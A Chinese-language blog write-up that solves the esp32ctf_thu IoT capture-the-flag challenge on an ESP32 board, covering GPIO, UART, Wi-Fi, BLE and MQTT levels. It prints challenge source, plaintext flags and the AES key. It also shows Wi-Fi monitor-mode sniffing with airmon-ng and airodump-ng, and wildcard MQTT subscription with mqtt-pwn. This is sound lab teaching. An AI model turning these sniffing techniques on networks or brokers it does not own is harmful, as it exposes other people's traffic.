# esp32ctf_thu题目复现
> Aiyflowers
> 来源：https://www.iotsec-zone.com/article/507

### 前言
由于本人手上刚好有一块esp32板子，想烧录一些固件进去玩玩，浏览网络发现了esp32ctf_thu项目。感觉很有意思，兼顾硬件、wifi、蓝牙、mqtt。因此决定学习一下题目。

题目项目地址：[https://github.com/xuanxuanblingbling/esp32ctf_thu](https://github.com/xuanxuanblingbling/esp32ctf_thu)

选用开发板：ESP32-WROOM-32D

![0.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbon4zltvw3obltu16.png)

![1.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbon553o1bwrkicpfl.png)

硬件连接：[硬件连接 - ESP32 - — ESP-AT 用户指南 latest 文档](https://docs.espressif.com/projects/esp-at/zh_CN/latest/esp32/Get_Started/Hardware_connection.html)

驱动安装：从[CP210x USB to UART Bridge VCP Drivers - Silicon Labs](https://www.silabs.com/software-and-tools/usb-to-uart-bridge-vcp-drivers?tab=downloads)下载，如果不安装驱动不会识别串口

### 前期准备
#### 安装esp-idf&&进行烧录
[https://dl.espressif.com/dl/esp-idf/](https://dl.espressif.com/dl/esp-idf/)

下拉选择4.2.2版本的下载即可、按照安装提示傻瓜式安装！基本上全点ok即可

![2.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbon5nctoqnlpfjo15.png)

安装驱动，选择对应版本的操作系统

![3.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbon5r8f1mhdrh6kje.png)
用正确的数据线连接且正确安装驱动后，即可弹出串口驱动

![4.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbon5wwjsxolm0i6fk.png)
可以看到我的串口是com7

接着在终端里进入到指定目录执行下面

```shell
  idf.py menuconfig 
```
**menuconfig设置如下**
```shell
Serial flasher config  --->  Flash size (4 MB) 
Partition Table        --->  Partition Table (Custom partition table CSV)
一定要设置！不然烧录上也会无限重启
```

![5.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbon79vi5wixcw6fa6.png)

接着执行

```shell
idf.py build 
```

![6.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbon7drlygyalj19ch.png)

接着就进行flash烧录即可，注意串口

如果下载提示报错，大概率是没有自动进入下载模式

**进入下载模式**

```js
ESP32 需要进入 bootloader 模式才可以烧录，有两种方式：
自动方式（大部分开发板支持）
idf.py 会自动让 ESP32 进入 boot 模式。
但有些板子不支持，需要 手动按键操作
 手动进入下载模式：
1. 按住 BOOT（IO0）按钮不要松
2. 按一下 EN（或 RST）复位按钮，然后松开
3. 再松开 BOOT 按钮
4. 立即运行 idf.py -p COM7 flash
或者出现 Connecting..... 的时候摁住板子上的 BOOT 键(推荐)
```
烧录成功

![7.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbon88p0042d9eppez.png)

执行idf.py -p COM7 monitor输出结果不是疯狂输出、说明烧录成功无报错，成功启动

![8.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbon8eworx7vbhjadf.png)

## 学习题目
首先观察上面的图片会发现其实程序一启动就执行了mqtt task，而不是我们想要的硬件关卡，所以我们需要先让其进入硬件关卡。阅读main.c源码

```c
#include "freertos/FreeRTOS.h"
#include "freertos/task.h
#include "hardware.c"
#include "bluetooth.c"
#include "network.c"
#include "mqtt.c"
#include "connect.c"
#include "mode.c"
void app_main(void)
{   
    // init
    nvs_init();
    flag_init();
    checkmode_gpio_setup();
    hardware_gpio_setup();
    hardware_uart_setup();
    if(check()){
        printf("[+] now task : hardware, bluetooh, network\n");
        // hardware THUCTF{DuMp_the_b1n_by_espt00l.py_Ju5t_1n_0ne_Lin3} flag{you_will_never_kown_this_flag}
        xTaskCreate(hardware, "THUCTF{DuMp_the_b1n_by_espt00l.py_Ju5t_1n_0ne_Lin3}", 2048, NULL, 10, NULL);
        // bluetooth
        bt_app_gap_start_up();
        xTaskCreate(bt_loop, "bt_loop", 2048, NULL, 10, NULL);
        // network
        network_init();
        xTaskCreate(network_tcp, "network_tcp", 2048, NULL, 10, NULL);
        xTaskCreate(network_http, "network_http", 2048, NULL, 10, NULL);
        xTaskCreate(network_wifi, "network_wifi", 2048, NULL, 10, NULL);
    }else{
        printf("[+] now task : MQTT\n");
        // MQTT
        connect_wifi("THUCTFIOT","mqttwifi@123");
        mqtt_app_start("mqtt://mqtt.esp32ctf.xyz");
    }
}
//➜   python ~/Desktop/esp/esp-idf2/components/esptool_py/esptool/esptool.py --baud 115200 --port /dev/tty.usbserial-14420 read_flash 0x10000 0x310000 dump.bin
```

发现如果 check() 返回 1才进入非mqtt的关卡、那么我们需要去看一下check函数具体实现在哪里，发现在mode.c中

```c
#include <stdio.h>
#include <string.h>
#include "freertos/task.h"
#include "driver/gpio.h"
#include "driver/uart.h"
#include "esp_system.h"
#include "esp32/aes.h"

void get_random(char * output,int number){
    for(int i = 0; i<number ;i++){
        char a = esp_random() % 26 + 97;
        output[i] = a;
    }
}

void checkmode_gpio_setup(){
    gpio_config_t io_conf;
    io_conf.pin_bit_mask = ((1ULL<<23) );
    io_conf.mode = GPIO_MODE_INPUT_OUTPUT;
    io_conf.intr_type = GPIO_INTR_POSEDGE;
    gpio_config(&io_conf);
}

int check(){
    gpio_set_level(23,1);
    vTaskDelay(1000 / portTICK_RATE_MS);
    return gpio_get_level(23) ? 0 : 1 ;
}

void decrypt_flag(char * c,char *m)
{
    char plaintext[64]={0};
    char encrypted[64]={0};

    memcpy(encrypted,c,64);

	uint8_t key[32]= "\x36\x48\xb4\x4b\x70\x3b\x7d\x35\xd4\xb2\x1b\x7a\xd9\xb7\xd0\xf4"
                     "\x5f\x3f\x1c\x74\x4e\xe6\xc9\x12\xe4\x24\xe3\x0d\xd8\x06\x92\x4a" ;

	uint8_t iv[16]=  "\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf\x0a\x22\x59" ;

	esp_aes_context ctx;
	esp_aes_init( &ctx );
	esp_aes_setkey( &ctx, key, 256 );
	esp_aes_crypt_cbc( &ctx, ESP_AES_DECRYPT, sizeof(encrypted), iv, (uint8_t*)encrypted, (uint8_t*)plaintext );
    
    sprintf(m,"%s",plaintext);
	esp_aes_free( &ctx );
}

void flag_init(){
    decrypt_flag(hardware_flag_1_en,hardware_flag_1);
    decrypt_flag(hardware_flag_2_en,hardware_flag_2);
    decrypt_flag(hardware_flag_3_en,hardware_flag_3);

    decrypt_flag(mqtt_flag_1_en,mqtt_flag_1);
    decrypt_flag(mqtt_flag_2_en,mqtt_flag_2);
    decrypt_flag(mqtt_flag_3_en,mqtt_flag_3);

    decrypt_flag(bt_flag_1_en,bt_flag_1);
    decrypt_flag(bt_flag_2_en,bt_flag_2);
    decrypt_flag(bt_flag_3_en,bt_flag_3);

    decrypt_flag(network_flag_1_en,network_flag_1);
    decrypt_flag(network_flag_2_en,network_flag_2);
    decrypt_flag(network_flag_3_en,network_flag_3);
}
```

那么很明显假如我们想要进入硬件关卡肯定需要先给gpio23接地拉低电平

![9.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbon9k81d7lepjo5gt.png)

再次点击板子上的en重启即可发现成功进入mqtt之外的关卡

![10.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbona1qylf8ozps5e6.png)

(注意这个输出是硬件关卡,蓝牙关卡,网络关卡同时启动了.因此后续不会再次输出第二遍)

---

### 硬件题目
硬件task在main/hardware.c中

```c
#include <stdio.h>
#include <string.h>
#include "freertos/task.h"
#include "driver/gpio.h"
#include "driver/uart.h"

#define GPIO_INPUT_IO_0     18
#define GPIO_INPUT_PIN_SEL  ((1ULL<<GPIO_INPUT_IO_0) )
#define ESP_INTR_FLAG_DEFAULT 0

#define ECHO_TEST_TXD  (GPIO_NUM_4)
#define ECHO_TEST_RXD  (GPIO_NUM_5)
#define ECHO_TEST_RTS  (UART_PIN_NO_CHANGE)
#define ECHO_TEST_CTS  (UART_PIN_NO_CHANGE)

int trigger = 0;

// char hardware_flag_1[] = "flag{this_is_hardware_flag1}"; // THUCTF{Ev3ryth1ng_st4rt_fr0m_GPIO_!!!}
// char hardware_flag_2[] = "flag{this_is_hardware_flag2}"; // THUCTF{AuT0++_is_th3_r1ght_w4y_hhhhhh}
// char hardware_flag_3[] = "flag{this_is_hardware_flag3}"; // THUCTF{UART_15_v3ry_imp0r7ant_1n_i0T}

char hardware_flag_1[39] = {0};
char hardware_flag_2[39] = {0};
char hardware_flag_3[38] = {0};

char hardware_flag_1_en[]="\x2b\x21\x9a\xe7\x5e\xca\x6b\x94\xe6\x03\x70\x08\x0f\xc5\x72\x4e\xda\x01\x45\xb8\x0c\xb3\xe3\xb0\xd5\xf4\xd3\x87\x5e\xa2\x2b\x52\x70\x8b\x68\xa0\xa5\x39\x4a\xd2\x23\xb1\xfc\x1d\x11\x3a\x61\xb7\x5d\x12\xf8\x6b\x5e\x22\xd6\x51\x17\x15\xf7\x62\x24\xb1\xe1\x05";
char hardware_flag_2_en[]="\x23\x9d\xfa\x61\xa8\x39\xf7\x26\x2c\x91\x55\x8c\xbe\x14\x77\x07\xd2\x01\xbb\xe9\x06\x1e\xc0\xcc\xf4\xa2\xf0\x45\x16\x9d\x3e\xc3\x9c\x0d\xde\x32\x40\x31\xb8\x82\xce\x05\xa8\xcb\xb4\xda\x2a\x0e\xf4\x73\x85\x99\xa6\xd1\x5a\xc2\xa2\x46\xc2\xed\x25\xcc\xf7\x1c";
char hardware_flag_3_en[]="\xf5\x47\x50\x55\x62\xed\xd1\xe9\x32\xc9\xea\x24\x21\x21\x0d\xde\xcb\x94\x1e\x66\x7b\xa2\xb0\x18\x64\x53\x25\xe2\x1e\x69\x86\x91\x8d\x86\xd4\x18\x04\x08\xc3\x1c\x04\xf8\x0a\x47\xd2\x54\x1e\x77\xf5\xf7\xbf\x23\x57\x31\x40\x89\x9a\x0f\x67\xd8\x4c\xfd\x32\x9c";

static void IRAM_ATTR gpio_isr_handler(void* arg){
    trigger++;
}

void hardware_uart_setup(){
    uart_config_t uart_config = {
        .baud_rate = 115200,
        .data_bits = UART_DATA_8_BITS,
        .parity    = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_APB,
    };
    uart_driver_install(UART_NUM_1, 1024 * 2, 0, 0, NULL, 0);
    uart_param_config(UART_NUM_1, &uart_config);
    uart_set_pin(UART_NUM_1, ECHO_TEST_TXD, ECHO_TEST_RXD, ECHO_TEST_RTS, ECHO_TEST_CTS);
}

void hardware_gpio_setup(){
    gpio_config_t io_conf;
    io_conf.pin_bit_mask = GPIO_INPUT_PIN_SEL;
    io_conf.mode = GPIO_MODE_INPUT;
    io_conf.intr_type = GPIO_INTR_POSEDGE;
    io_conf.pull_up_en = 0;
    gpio_config(&io_conf);
    gpio_install_isr_service(ESP_INTR_FLAG_DEFAULT);
    gpio_isr_handler_add(GPIO_INPUT_IO_0, gpio_isr_handler, (void*) GPIO_INPUT_IO_0);
}

void hardware_task1(){
    int hit = 0;
    while(1) {
        printf("[+] hardware task I : hit %d\n",hit);
        if(gpio_get_level(GPIO_INPUT_IO_0)){
            hit ++ ;
        }else{
            hit = 0;
        }
        if(hit>3){
            printf("[+] hardware task I : %s\n",hardware_flag_1);
            break;
        }
        vTaskDelay(1000 / portTICK_RATE_MS);
    }
}

void hardware_task2(){
    trigger = 0;
    while(1){
        printf("[+] hardware task II : trigger %d\n",trigger);
        if(trigger > 10000){
            printf("[+] hardware task II : %s\n",hardware_flag_2);
            break;
        }
        vTaskDelay(1000 / portTICK_RATE_MS);
    }
}

void hardware_task3(){
    printf("[+] hardware task III : find the third flag in another UART\n");
    while (1) {
        uart_write_bytes(UART_NUM_1, hardware_flag_3, strlen(hardware_flag_3));
        vTaskDelay(1000 / portTICK_RATE_MS);
    }
}

void hardware(){
    hardware_task1();
    hardware_task2();
    hardware_task3();
}
```

#### 硬件task1
阅读源码，得到如果gpio18引脚接到 3.3V，保持 4 秒左右即可得到flag。我们找一个杜邦线将板子上的gpio18和3v3相连，同时观察串口打印输出

![11.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonaf4n4mazrxg0mf.png)

![12.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonahj8wk9ej8a1vb.png)
同时也开始进入硬件task2

#### 硬件task2
```c
void hardware_task2(){
    trigger = 0;
    while(1){
        printf("[+] hardware task II : trigger %d\n",trigger);
        if(trigger > 10000){
            printf("[+] hardware task II : %s\n",hardware_flag_2);
            break;
        }
        vTaskDelay(1000 / portTICK_RATE_MS);
    }
}
```

需要我们的trigger>10000,而trigger由以下代码控制

```c
// 中断服务程序（Interrupt Service Routine）
// 关键字 IRAM_ATTR 表示该函数应放在 IRAM（内部 RAM）中，保证中断时可以快速访问
// 该函数会在 GPIO 引脚发生中断事件时被调用（例如电平变化）
static void IRAM_ATTR gpio_isr_handler(void* arg){
    // 每次中断发生，trigger 变量加 1
    // 用于统计 GPIO 中断的次数，驱动业务逻辑（如达到特定次数后触发 flag）
    trigger++;
}
在hardware.c中继续找发现
void hardware_gpio_setup(){
    gpio_config_t io_conf;
    io_conf.pin_bit_mask = GPIO_INPUT_PIN_SEL;
    io_conf.mode = GPIO_MODE_INPUT;
    io_conf.intr_type = GPIO_INTR_POSEDGE;  // 上升沿触发中断
    io_conf.pull_up_en = 0;
    gpio_config(&io_conf);

    gpio_install_isr_service(ESP_INTR_FLAG_DEFAULT);
    gpio_isr_handler_add(GPIO_INPUT_IO_0, gpio_isr_handler, (void*) GPIO_INPUT_IO_0);
}
```

那么我们快速触发GPIO18的上升沿中断（比如用杜邦线短接或者高频率抖动）让`trigger`计数累加；  

上升沿中断就是低平到高平的变化触发的中断

```shell
GPIO电平
 |        _______
 |       /
 |______/          时间-->
        ↑
     这个位置是上升沿
```

那么我们即可先让gpio18利用杜邦线连接到3.3v再将杜邦线拔掉,再次利用杜邦线连接上.重复该步骤一万次,锻炼一下手速.

当然我们还可以直接将tx和gpio18利用杜邦线连接

```shell
原理
TX脚：串口的发送引脚，会以一定波特率输出数据。它的电平随串口数据的二进制变化而切换高低电平。
```

![13.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonbeqa8peqn5gdiz.png)

#### 硬件task3
```c
// 定义UART的引脚映射
#define ECHO_TEST_TXD  (GPIO_NUM_4)        // UART的tx连接到GPIO4
#define ECHO_TEST_RXD  (GPIO_NUM_5)        // UART的rx连接到GPIO5
#define ECHO_TEST_RTS  (UART_PIN_NO_CHANGE) // 不使用RTS硬件流控，引脚保持不变
#define ECHO_TEST_CTS  (UART_PIN_NO_CHANGE) // 不使用CTS硬件流控，引脚保持不变

// 初始化UART的配置和驱动
void hardware_uart_setup(){
    uart_config_t uart_config = {
        .baud_rate = 115200,               // 设置波特率为115200
        .data_bits = UART_DATA_8_BITS,    // 数据位8位
        .parity    = UART_PARITY_DISABLE, // 不使用奇偶校验
        .stop_bits = UART_STOP_BITS_1,    // 1个停止位
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE, // 禁用硬件流控
        .source_clk = UART_SCLK_APB,      // 选择APB时钟作为UART时钟源
    };
    // 安装UART驱动，设置接收缓冲区大小为2048字节，发送缓冲区设置为0
    uart_driver_install(UART_NUM_1, 1024 * 2, 0, 0, NULL, 0);
    
    // 配置UART参数
    uart_param_config(UART_NUM_1, &uart_config);
    
    // 设置UART引脚，将UART1的TX和RX引脚绑定到GPIO4和GPIO5
    uart_set_pin(UART_NUM_1, ECHO_TEST_TXD, ECHO_TEST_RXD, ECHO_TEST_RTS, ECHO_TEST_CTS);
}

// 通过UART持续发送第三个硬件flag字符串
void hardware_task3(){
    printf("[+] hardware task III : find the third flag in another UART\n");
    
    while (1) {
        // 发送hardware_flag_3字符串数据
        uart_write_bytes(UART_NUM_1, hardware_flag_3, strlen(hardware_flag_3));
        
        // 延时1秒，避免过于频繁发送
        vTaskDelay(1000 / portTICK_RATE_MS);
    }
}

```

那么很清楚我们的uart tx是gpio4,那么利用ft232连接上uart看输出即可.(只用连接gnd和rx连接到gpio4即可)

记得设备管理器里看一下是哪个串口,然后使用mobaxterm连接串口时候波特率以及串口都要设置正确.

![14.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonbw30sovt3qwkls.png)

mobaxterm查看串口输出即可

![15.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonbziefqiwgucgi0.png)

硬件题目结束

---

### 网络题目
开始网络题目.网络题目的代码在network.c中

```c
#include <string.h>
#include <sys/param.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_netif.h"

#include "nvs_flash.h"
#include "lwip/err.h"
#include "lwip/sys.h"

#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include "lwip/dns.h"

static const char *TAG = "network";

// 原始 flag 已被注释，用于参考解密
// char network_flag_1[] = "flag{this_is_network_flag1}"; // THUCTF{M4k3_A_w1rele55_h0t5p0ts}
// char network_flag_2[] = "flag{this_is_network_flag2}"; // THUCTF{Sn1ffer_N3tw0rk_TrAffic_In_7h4_Main_r0aD}
// char network_flag_3[] = "flag{this_is_network_flag3}"; // THUCTF{Y0u_cAn_s3nd_4nd_sNiff3r_802.11_r4w_pAckag3}

// 解密后用于存放 flag 的缓冲区
char network_flag_1[33] = {0};
char network_flag_2[49] = {0};
char network_flag_3[52] = {0};

// 加密形式存储的 flags
char network_flag_1_en[] = "\xe6\x62\xad..."; // 第一段加密数据
char network_flag_2_en[] = "\x5f\xcd\x46..."; // 第二段加密数据
char network_flag_3_en[] = "\xb6\x8e\xc4..."; // 第三段加密数据

int open_next_tasks = 0; // 控制任务阶段开启的标志

// 外部定义的函数，用于获取随机字符串和连接 Wi-Fi
void get_random(char * a,int b);
void connect_wifi(char *a, char *b);

// 初始化 Wi-Fi，并随机生成 ssid 和密码
void network_init(){
    char ssid[0x10] = {0};
    char pass[0x10] = {0};
    get_random(ssid,6);   // 生成 6 位随机 SSID
    get_random(pass,8);   // 生成 8 位随机密码
    printf("[+] network task I: I will connect a wifi -> ssid: %s , password %s \n",ssid,pass);
    connect_wifi(ssid,pass); // 连接 Wi-Fi
}

// 启动一个 TCP 监听任务，当收到 "getflag" 命令时发送第一个 flag
static void network_tcp()
{
    char addr_str[128];
    struct sockaddr_in dest_addr;

    // 配置监听地址为 0.0.0.0:3333
    dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(3333);

    int listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    ESP_LOGI(TAG, "Socket created");

    bind(listen_sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    ESP_LOGI(TAG, "Socket bound, port %d", 3333);

    listen(listen_sock, 1);  // 设置监听队列
    while (1) {
        ESP_LOGI(TAG, "Socket listening");

        struct sockaddr_storage source_addr;
        socklen_t addr_len = sizeof(source_addr);
        int sock = accept(listen_sock, (struct sockaddr *)&source_addr, &addr_len); // 接收连接

        inet_ntoa_r(((struct sockaddr_in *)&source_addr)->sin_addr, addr_str, sizeof(addr_str) - 1);
        ESP_LOGI(TAG, "Socket accepted ip address: %s", addr_str);

        char buffer[100];
        while(recv(sock, buffer, 0x10, 0)){  // 接收客户端数据
            if(strstr(buffer, "getflag")){   // 如果收到 "getflag"，发送 flag
                send(sock, network_flag_1, strlen(network_flag_1), 0);
                break;
            } else {
                send(sock, "error\n", strlen("error\n"), 0); // 否则返回错误信息
            }
            vTaskDelay(1000 / portTICK_RATE_MS);
        }

        open_next_tasks = 1; // 标记可以进行下一阶段任务
        shutdown(sock, 0);   // 关闭连接
        close(sock);
    }
}

// 向 www.baidu.com 发送 HTTP 请求，header 中包含第二个 flag
void network_http()
{
    char fmt[]  = "GET / HTTP/1.0\r\n"
                  "Host: www.baidu.com:80\r\n"
                  "User-Agent: esp-idf/1.0 esp32\r\n"
                  "flag: %s\r\n"
                  "\r\n";
    
    char request[200];
    sprintf(request, fmt, network_flag_2); // 构造带 flag 的 HTTP 请求

    const struct addrinfo hints = {
        .ai_family = AF_INET,
        .ai_socktype = SOCK_STREAM,
    };
    struct addrinfo *res;
    struct in_addr *addr;
    int s;

    while(1) {
        if(open_next_tasks){
            printf("[+] network task II : send the second flag to baidu\n");
            getaddrinfo("www.baidu.com", "80", &hints, &res); // DNS 解析
            addr = &((struct sockaddr_in *)res->ai_addr)->sin_addr;
            ESP_LOGI("network", "DNS lookup succeeded. IP=%s", inet_ntoa(*addr));
            s = socket(res->ai_family, res->ai_socktype, 0); // 创建 socket
            connect(s, res->ai_addr, res->ai_addrlen);       // 连接服务器
            freeaddrinfo(res);                               // 释放 addrinfo 结构
            write(s, request, strlen(request));              // 发送 HTTP 请求
            close(s);                                        // 关闭连接
        }
        vTaskDelay(10000 / portTICK_PERIOD_MS); // 每 10 秒尝试一次
    }
}

// 构造 raw 802.11 数据帧，广播带第三个 flag 的数据包
static void network_wifi()
{
    // 构造的 802.11 DS-to-DS 帧（伪造）
    static const char ds2ds_pdu[] = {
        0x48, 0x03, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0xE8, 0x65, 0xD4, 0xCB, 0x74, 0x19, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x60, 0x94, 0xE8, 0x65, 0xD4, 0xCB, 0x74, 0x1C, 0x26, 0xB9,
        0x0D, 0x02, 0x7D, 0x13, 0x00, 0x00, 0x01, 0xE8, 0x65, 0xD4, 0xCB, 0x74,
        0x1C, 0x00, 0x00, 0x26, 0xB9, 0x00, 0x00, 0x00, 0x00,
    };

    char pdu[200] = {0};
    memcpy(pdu, ds2ds_pdu, sizeof(ds2ds_pdu));                              // 拷贝头部帧
    memcpy(pdu + sizeof(ds2ds_pdu), network_flag_3, sizeof(network_flag_3)); // 添加 flag 数据

    while(1) {
        if(open_next_tasks){
            printf("[+] network task III : send raw 802.11 package contains the third flag\n");
            esp_wifi_80211_tx(ESP_IF_WIFI_STA, pdu, sizeof(ds2ds_pdu) + sizeof(network_flag_3), true); // 发射原始 Wi-Fi 帧
        }
        vTaskDelay(5000 / portTICK_PERIOD_MS); // 每 5 秒发送一次
    }
}

```

#### 网络task1

![16.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonceezwsduknhdz4.png)

[+] network task I: I will connect a wifi -> ssid: ulfuwa , password uuimubyf

~~那么很明显我们需要将wifi的ssid和密码对应修改,手机开一个热点~~

其实电脑开热点更方便!!!

![17.png](https://www.iotsec-zone.com/api/image/v2/20250729/dboncm0s46kxtofupq.png)

等待板子连接上热点

![18.png](https://www.iotsec-zone.com/api/image/v2/20250729/dboncpbb0dyb9snagf.png)

发现ip为192.168.57.161 且开启了一个3333的端口

我们电脑也连接上热点,接着用nc去连接端口

```c
while(recv(sock,buffer,0x10,0)){
            if(strstr(buffer,"getflag")){
                send(sock, network_flag_1, strlen(network_flag_1), 0);
                break;
            }else{
                send(sock, "error\n", strlen("error\n"), 0);
            }
            vTaskDelay(1000 / portTICK_RATE_MS);
        }
        open_next_tasks = 1;
        shutdown(sock, 0);
        close(sock);
    }
```

观察程序逻辑,发现输入getflag即可得到flag

![19.png](https://www.iotsec-zone.com/api/image/v2/20250729/dboncx4mv0fajmyaau.png)

#### 网络task2

![20.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonczrurior8ace80.png)

查看task2发现提示发送了第二个flag到baidu，那么我们需要抓取它的流量

先按着en重启后,我们用电脑开启设置热点,让他重新连接wifi.

![21.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbond235e19at3ejup.png)
接着用wireshark进行抓包

![22.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbond7od9sqmp1o0nt.png)

#### 网络task3

![23.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbondc6tvjt5nlhakz.png)

提示我们它发送了802.11的明文数据包，且flag在数据包里。

 802.11 是 Wi-Fi 无线通信协议的标准。通过抓取 802.11 数据包，可以看到无线网络中设备之间交换的各种信息，比如连接请求、认证、Beacon 广播等。  

接着task3.我们需要抓802.11的数据包.这需要用到无线网卡.

![24.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbondg7mvzrixid85d.png)

![25.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbondki9p37uqovlhv.png)

接着执行

```shell
airmon-ng start wlan0
```

![26.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbondq70lbirym9jxm.png)

```shell
airodump-ng wlan0
```

![27.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbondsk2nutih7qlpf.png)

接着wireshark进行抓包

![28.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbondv9dymkaeudxmq.png)

注意,这个发包如果抓不到,检查步骤是否正确,若无问题,等待大概30-60s即可.（测试不太好抓到，多抓一段时间）

其实还有一种方法利用微软的network monitor去抓无线网卡的数据包。（其实代替了kali里的这两条命令）

记得把网卡设置为monitor模式

![29.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbondysgd6k053j3so.png)

抓到的包保存为cap文件，用wireshark打开分析即可。

---

### 蓝牙题目
#### 蓝牙task1

![30.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbone60zlukhovykd0.png)

[+] now task : hardware, bluetooh, network

[+] bluetooth task I : Please change your bluetooth device name to fdzbvsgj

这边它一直在检查我们的蓝牙名称

![31.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbone8sb0imslrmw3k.png)

我们将蓝牙名称设置为它想让我们修改的(由于我重启了,所以可能两次蓝牙名字不一样,但无伤大雅)

![32.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonec4ssthbkuvkzh.png)

#### 蓝牙task2
```shell
[+] bluetooth task II : BLE device name is gttsp
[+] bluetooth task II : Please find the second flag in the ADV package from this BLE device gttsp
I (102682) GAP: [+] bluetooth task I : Found a target device, address dc:2d:04:d5:c0:36, name edyrwmim
I (102712) GATT: REGISTER_APP_EVT, status 0, app_id 0
I (102712) GATT: CREATE_SERVICE_EVT, status 0,  service_handle 40
I (102712) GATT: SERVICE_START_EVT, status 0, service_handle 40
I (102712) GATT: ADD_CHAR_EVT, status 0,  attr_handle 42, service_handle 40
I (102722) GATT: the gatts demo char length = 3
I (102732) GATT: prf_char[0] =11
I (102732) GATT: prf_char[1] =22
I (102742) GATT: prf_char[2] =33
I (102742) GATT: ADD_DESCR_EVT, status 0, attr_handle 43, service_handle 40
```

提示告诉我们flag藏在ble的广播包里,查看的方式很多

sniffer+wireshark拦截抓包 或者connect

![33.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonepgs2te8k5keak.png)

也可以选择直接用app查看

![34.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonesvzaqzpncruoh.png)

最终得到flag

![35.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonevjy7i08jjhdml.png)

#### 蓝牙task3
因为终端输出没有任何提示了,因此我们查看源码搜索task3

![36.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonf0tyb7e8l8clks.png)

阅读源码得知我们需要<font style="color:rgb(51, 51, 51);">发送 task2 的 flag</font>

测试了connect 发现貌似无法写入，用app写入成功

![37.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonf4s9ofs06l9oxe.png)

![38.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonf99qx3vscsb6ht.png)
使用16进制转ASCII即可得到flag
![39.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonfee0jvqmy43lhi.png)

---

### mqtt题目
现在我们需要对源码进行修改,重新烧录.

#### mqtt重烧录
拉取docker镜像

进入到docker目录下执行

```shell
docker build -t esp32ctf .
```

![40.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbongda8m6qitf0dyu.png)

```shell
docker run -d -p 1883:1883 esp32ctf
```

![41.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbongfw8yi9zmt2tm6.png)

修改main.c中这一处,根据自己的ip和待会想让它连接的wifi进行调整

```c
        // MQTT
        connect_wifi("THUCTFIOT","mqttwifi@123");
        mqtt_app_start("mqtt://mqtt.esp32ctf.xyz");
```

![42.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbongnqapqdgf7pavy.png)
我手机热点也设置如下

![43.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbongrsndmi5znwmev.png)
接着重新烧录,步骤和以前一样(串口号自己调整)

```shell
idf.py build 
idf.py -p COM7 flash
```

这次我们不需要连线(gpio23和gnd线不用连),直接重启即可进入mqtt关卡

![44.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbongvkb3cq5kdosy1.png)

#### mqtt-task1
```shell
[+] MQTT task II: I send second flag to baidu
I (393332) mqtt: MQTT_EVENT_DATA
[+] MQTT task II: topic ->  /topic/flag2/xfkoqk
[+] MQTT task II: data -> www.baidu.com?46

```

提示发送了flag,MQTT 中有通配符 `#` 表示所有的主题，只需要订阅 `#` 就会收到所有的主题的消息，使用 MQTTX 订阅 `#`

![45.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonh2lmota8j5tuvo.png)

即可看到flag.如果看不到保持mqtt订阅,重启设备即可

![46.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonhkhyqovafqmqsl.png)

也可以使用mqtt-pwn

```shell
connect -o 192.168.57.88 -p 1883  连接mqtt
discovery				#等待发现完成
scans -i id
messages -tr flag1  #有概率失败,也有概率成功.这个失败概率大些
```

![47.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonhnge72b3ln9xit.png)

#### mqtt-task2&3

![48.png](https://www.iotsec-zone.com/api/image/v2/20250729/dbonhpyoz92qnwhmgw.png)

